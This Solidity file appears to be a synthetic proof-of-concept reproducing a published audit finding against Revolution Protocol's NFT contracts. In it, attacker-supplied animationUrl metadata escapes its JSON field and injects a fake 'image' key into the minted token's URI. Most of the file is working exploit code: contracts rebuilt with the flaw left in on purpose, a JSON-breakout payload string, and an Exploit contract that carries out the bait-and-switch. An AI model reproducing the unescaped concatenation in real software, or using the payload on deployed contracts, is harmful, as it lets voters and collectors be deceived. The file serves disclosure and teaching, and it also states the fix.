// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Collective (Revolution Protocol) — VerbsToken.tokenURI() JSON injection
    via unsanitized CultureIndex.createPiece() metadata
    (Code4rena 2023-12-revolutionprotocol, finding #30090, H-03, ZanyBonzy)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground. CultureIndex's
    createPiece() stores attacker-supplied metadata.image / metadata.animationUrl
    with NO sanitization of JSON-breaking characters, and Descriptor's
    constructTokenURI() concatenates those fields directly into a JSON string
    with abi.encodePacked (no escaping). The Exploit deploys everything, submits
    a piece whose `animationUrl` field is a JSON-breakout payload, votes it in,
    mints it into a VerbsToken NFT, and shows the final on-chain metadata
    contains an INJECTED "image" key that differs from what voters approved
    (no fork, no cheatcodes).
//////////////////////////////////////////////////////////////////////////*/

/*//////////////////////////////////////////////////////////////
    Root cause: CultureIndex.createPiece() (src/CultureIndex.sol:L209-248)
    persists `metadata` verbatim without validating that `image` /
    `animationUrl` are free of JSON-special characters ('"', ':', ',').
    Descriptor.constructTokenURI() (src/Descriptor.sol:L97-112) then
    concatenates those fields directly into a JSON string via
    abi.encodePacked, so an attacker-chosen animationUrl containing
    `", "image": "..."` breaks out of its own field and injects a NEW
    "image" key into the token's metadata. Standard JSON.parse() resolves
    duplicate keys to the LAST occurrence, so the injected key silently
    overrides the image users voted on.

    This lets an attacker submit a piece that LOOKS like a legitimate art
    piece during voting (voters see the real IPFS image via
    CultureIndex.pieces[pieceId].metadata.image) but, once minted into a
    VerbsToken NFT, resolves to a completely different attacker-chosen
    image/animation for any consumer that does a standard JSON.parse of
    the decoded tokenURI.

    Recommended fix (per the report): sanitize `image` / `animationUrl`
    against the OWASP JSON Sanitizer before persisting them, or escape
    embedded quotes/backslashes when building the JSON string.
//////////////////////////////////////////////////////////////*/

/// @dev Minimal Base64 encoder (standard alphabet), faithful to the
///      OpenZeppelin Base64.encode used by the real Descriptor contract.
///      Base64 encoding is orthogonal to the bug (it is a lossless,
///      reversible transform) — kept here only so tokenURI() matches the
///      real data-URI shape byte-for-byte.
library Base64 {
    bytes internal constant TABLE = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    function encode(bytes memory data) internal pure returns (string memory) {
        if (data.length == 0) return "";
        bytes memory table = TABLE;
        uint256 len = data.length;
        uint256 encodedLen = 4 * ((len + 2) / 3);
        bytes memory result = new bytes(encodedLen);

        uint256 i = 0;
        uint256 j = 0;
        while (i + 3 <= len) {
            uint256 n = (uint256(uint8(data[i])) << 16) | (uint256(uint8(data[i + 1])) << 8) | uint256(uint8(data[i + 2]));
            result[j] = table[(n >> 18) & 0x3F];
            result[j + 1] = table[(n >> 12) & 0x3F];
            result[j + 2] = table[(n >> 6) & 0x3F];
            result[j + 3] = table[n & 0x3F];
            i += 3;
            j += 4;
        }
        uint256 rem = len - i;
        if (rem == 1) {
            uint256 n = uint256(uint8(data[i])) << 16;
            result[j] = table[(n >> 18) & 0x3F];
            result[j + 1] = table[(n >> 12) & 0x3F];
            result[j + 2] = "=";
            result[j + 3] = "=";
        } else if (rem == 2) {
            uint256 n = (uint256(uint8(data[i])) << 16) | (uint256(uint8(data[i + 1])) << 8);
            result[j] = table[(n >> 18) & 0x3F];
            result[j + 1] = table[(n >> 12) & 0x3F];
            result[j + 2] = table[(n >> 6) & 0x3F];
            result[j + 3] = "=";
        }
        return string(result);
    }
}

/// @dev Reduced art-piece metadata, matching ICultureIndex.ArtPieceMetadata
///      (mediaType/enum omitted — it does not affect the bug).
struct ArtPieceMetadata {
    string name;
    string description;
    string image;
    string text;
    string animationUrl;
}

struct CreatorBps {
    address creator;
    uint256 bps;
}

struct ArtPiece {
    uint256 pieceId;
    ArtPieceMetadata metadata;
    address sponsor;
}

/// @notice Reduced CultureIndex — art-piece submission + voting registry.
///         Faithful reduction of src/CultureIndex.sol (Revolution Protocol).
contract CultureIndex {
    uint256 public _currentPieceId;
    mapping(uint256 => ArtPiece) public pieces;
    uint256 public topVotedPieceId;
    bool public hasTopVoted;

    // ============================================================
    //  Vulnerable createPiece() — faithful reduction of
    //  src/CultureIndex.sol:L209-248 (Revolution Protocol)
    //  (validateCreatorsArray / validateMediaType / vote-weight
    //  bookkeeping omitted — they do not affect the bug)
    // ============================================================
    function createPiece(ArtPieceMetadata calldata metadata, CreatorBps[] calldata creatorArray) public returns (uint256) {
        uint256 pieceId = _currentPieceId++;

        ArtPiece storage newPiece = pieces[pieceId];
        newPiece.pieceId = pieceId;
        // @> VULN: metadata.image / metadata.animationUrl are stored VERBATIM with
        // no check for JSON-breaking characters (", :, ,). CultureIndex.sol:L231.
        // FIX: sanitize metadata.image / metadata.animationUrl (OWASP JSON Sanitizer)
        // before persisting, or reject strings containing '"'.
        newPiece.metadata = metadata;
        newPiece.sponsor = msg.sender;

        for (uint256 i; i < creatorArray.length; i++) {
            // creators recorded (bps accounting omitted — not relevant to the bug)
        }
        return newPiece.pieceId;
    }

    /// @notice Simplified voting: whichever piece is voted on becomes "top voted"
    ///         and eligible for minting (the real contract maintains a max-heap
    ///         ordered by accumulated vote weight — irrelevant to this bug).
    function vote(uint256 pieceId) external {
        topVotedPieceId = pieceId;
        hasTopVoted = true;
    }

    /// @notice What voters see DURING the voting stage — read straight off the
    ///         piece struct, exactly like the real front-end queries
    ///         `CultureIndex.pieces[pieceId].metadata.image`.
    function getPieceImage(uint256 pieceId) external view returns (string memory) {
        return pieces[pieceId].metadata.image;
    }

    function pieceMetadata(uint256 pieceId)
        external
        view
        returns (string memory name, string memory description, string memory image, string memory animationUrl)
    {
        ArtPieceMetadata storage m = pieces[pieceId].metadata;
        return (m.name, m.description, m.image, m.animationUrl);
    }
}

/// @notice Reduced Descriptor — builds the tokenURI JSON. Faithful reduction
///         of src/Descriptor.sol (Revolution Protocol).
contract Descriptor {
    // ============================================================
    //  Vulnerable constructTokenURI() — faithful reduction of
    //  src/Descriptor.sol:L97-112 (Revolution Protocol)
    // ============================================================
    function constructTokenURI(
        string memory name,
        string memory description,
        string memory image,
        string memory animation_url
    ) public pure returns (string memory) {
        string memory json = buildJSON(name, description, image, animation_url);
        return string(abi.encodePacked("data:application/json;base64,", Base64.encode(bytes(json))));
    }

    /// @dev The exact concatenation from constructTokenURI, extracted so the
    ///      Exploit can inspect the RAW (pre-base64) JSON — this is the same
    ///      code path tokenURI() executes, not a duplicate implementation.
    function buildJSON(string memory name, string memory description, string memory image, string memory animation_url)
        public
        pure
        returns (string memory)
    {
        return string(
            abi.encodePacked(
                '{"name":"',
                name,
                '", "description":"',
                description,
                '", "image": "',
                image,
                // @> VULN: animation_url is attacker-controlled and concatenated with
                // NO escaping — a value containing `", "image": "..."` breaks out of
                // its own field and injects a brand-new "image" key. Descriptor.sol:L106.
                '", "animation_url": "',
                animation_url,
                '"}'
            )
        );
    }
}

/// @notice Reduced VerbsToken — mints the winning piece as an NFT and serves
///         its tokenURI via Descriptor. Faithful reduction of
///         src/VerbsToken.sol (Revolution Protocol).
contract VerbsToken {
    CultureIndex public cultureIndex;
    Descriptor public descriptor;
    uint256 public nextTokenId;
    mapping(uint256 => uint256) public tokenPieceId;

    constructor(address _cultureIndex, address _descriptor) {
        cultureIndex = CultureIndex(_cultureIndex);
        descriptor = Descriptor(_descriptor);
    }

    /// @notice Mints the currently top-voted piece as an NFT (the real
    ///         _mintTo() pulls the piece via cultureIndex.dropTopVotedPiece();
    ///         simplified here to reading topVotedPieceId directly).
    function mint() external returns (uint256) {
        require(cultureIndex.hasTopVoted(), "no piece voted");
        uint256 pieceId = cultureIndex.topVotedPieceId();
        uint256 tokenId = nextTokenId++;
        tokenPieceId[tokenId] = pieceId;
        return tokenId;
    }

    /// @notice VerbsToken.sol:L193 — faithful reduction: fetch the minted
    ///         piece's metadata and hand it to Descriptor unmodified.
    function tokenURI(uint256 tokenId) public view returns (string memory) {
        uint256 pieceId = tokenPieceId[tokenId];
        (string memory name, string memory description, string memory image, string memory animationUrl) =
            cultureIndex.pieceMetadata(pieceId);
        return descriptor.constructTokenURI(name, description, image, animationUrl);
    }
}

/// @notice Attacker orchestrator. Deploys CultureIndex/Descriptor/VerbsToken,
///         submits a piece whose `animationUrl` is a JSON-breakout payload,
///         votes it in, mints it, and demonstrates that the final NFT
///         metadata contains an INJECTED image key differing from what
///         voters approved — all cheatcode-free.
contract Exploit {
    CultureIndex public cultureIndex; // CREATE nonce 1
    Descriptor public descriptor; // CREATE nonce 2
    VerbsToken public verbsToken; // CREATE nonce 3

    uint256 public pieceId;
    uint256 public tokenId;

    string internal constant REAL_IMAGE = "ipfs://realMonaLisa";
    string internal constant FAKE_IMAGE = "ipfs://fakeMonaLisa";
    // The attacker-controlled `animationUrl` field: breaks out of its own
    // JSON string and injects a brand-new "image" key.
    string internal constant INJECTION_PAYLOAD = '", "image": "ipfs://fakeMonaLisa';

    constructor() {
        cultureIndex = new CultureIndex(); // nonce 1
        descriptor = new Descriptor(); // nonce 2
        verbsToken = new VerbsToken(address(cultureIndex), address(descriptor)); // nonce 3
    }

    function run() external {
        // === 1. Attacker submits an art piece. Voters will see `image` =
        //        REAL_IMAGE; the malicious payload is hidden in `animationUrl`. ===
        CreatorBps[] memory creators = new CreatorBps[](1);
        creators[0] = CreatorBps({creator: address(this), bps: 10_000});

        ArtPieceMetadata memory metadata = ArtPieceMetadata({
            name: "Mona Lisa",
            description: "A renowned painting by Leonardo da Vinci",
            image: REAL_IMAGE,
            text: "",
            animationUrl: INJECTION_PAYLOAD
        });
        pieceId = cultureIndex.createPiece(metadata, creators);

        // === 2. Voting stage: the front end reads `image` straight from
        //        CultureIndex — the REAL ipfs link, exactly what was pitched. ===
        cultureIndex.vote(pieceId);
        string memory imageDuringVoting = cultureIndex.getPieceImage(pieceId);
        require(keccak256(bytes(imageDuringVoting)) == keccak256(bytes(REAL_IMAGE)), "voting-stage image is wrong");

        // === 3. The piece is minted into a VerbsToken NFT after voting closes. ===
        tokenId = verbsToken.mint();

        // === 4. Query the REAL tokenURI() call path (base64 JSON data URI). ===
        string memory uri = verbsToken.tokenURI(tokenId);
        require(bytes(uri).length > 0, "empty tokenURI");

        // === 5. HARM: the RAW JSON embedded in the minted NFT contains an
        //        INJECTED "image" key pointing at the attacker's FAKE_IMAGE.
        //        A standard `JSON.parse()` consumer resolves duplicate keys to
        //        the LAST occurrence, so the NFT's effective image differs from
        //        what voters approved — the classic bait-and-switch. ===
        (string memory nm, string memory desc, string memory img, string memory anim) = cultureIndex.pieceMetadata(pieceId);
        string memory rawJson = descriptor.buildJSON(nm, desc, img, anim);

        require(_contains(bytes(rawJson), bytes(FAKE_IMAGE)), "injected fake image not present in minted metadata");
        require(_contains(bytes(rawJson), bytes(REAL_IMAGE)), "real image should still be present as bait");
        require(
            keccak256(bytes(imageDuringVoting)) != keccak256(bytes(FAKE_IMAGE)),
            "harm not demonstrated: voting-stage image already equalled the fake image"
        );
    }

    /// @dev Naive O(n*m) substring search — fine for the short strings used here.
    function _contains(bytes memory haystack, bytes memory needle) internal pure returns (bool) {
        if (needle.length == 0 || haystack.length < needle.length) return false;
        for (uint256 i = 0; i <= haystack.length - needle.length; i++) {
            bool found = true;
            for (uint256 j = 0; j < needle.length; j++) {
                if (haystack[i + j] != needle[j]) {
                    found = false;
                    break;
                }
            }
            if (found) return true;
        }
        return false;
    }
}
